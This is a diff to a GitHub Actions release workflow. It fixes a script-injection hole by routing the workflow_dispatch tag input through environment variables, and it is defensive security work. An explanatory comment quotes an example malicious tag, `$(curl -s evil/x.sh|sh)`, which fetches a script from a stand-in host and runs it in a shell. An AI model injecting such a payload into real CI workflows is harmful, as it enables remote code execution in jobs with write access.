@@ -174,11 +174,19 @@ jobs:
 
       - name: Resolve tag
         id: tag
+        env:
+          # Pass the workflow_dispatch input through the environment rather than
+          # interpolating it into the script. Direct ${{ }} interpolation splices
+          # attacker-controlled text into bash in a job that holds
+          # `contents: write`, so a tag like `$(curl -s evil/x.sh|sh)` — or one
+          # containing a newline — would execute or forge step outputs.
+          TAG_INPUT: ${{ github.event.inputs.tag }}
+          EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ "${{ github.event_name }}" = "push" ]; then
+          if [ "$EVENT_NAME" = "push" ]; then
             echo "tag=${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
           else
-            echo "tag=${{ github.event.inputs.tag }}" >> "$GITHUB_OUTPUT"
+            echo "tag=$TAG_INPUT" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Create / update Release
